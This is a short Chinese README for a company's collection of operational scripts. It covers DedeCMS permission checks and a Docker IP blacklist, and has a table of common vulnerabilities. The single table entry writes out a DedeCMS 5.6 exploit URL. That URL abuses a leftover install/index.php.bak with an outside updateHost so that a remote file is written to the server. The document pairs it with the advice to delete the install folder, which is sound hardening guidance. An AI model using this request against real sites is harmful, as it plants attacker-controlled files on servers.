# **仁裕元科技出品- 一些项目中用到的脚本** #
* 20181103修改blacklist-docker.py 忽略IP处理
* 20181123修改dede_check.py  dede权限空制 结合crontab做定时处理
----
#### 1 常用系统漏洞
| 软件名称 | 实例  | 说明 | 备注 |
| :------------ | :------------ | :------------ | :------------ |
| dedecms5.6 | `http://你的dedecms网址/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../xss.php&updateHost=http://www.xmyisu.com/`  | 安装dedecms 后会  生成install/index.php.bak这个文件.| 建议删除install文件夹 |
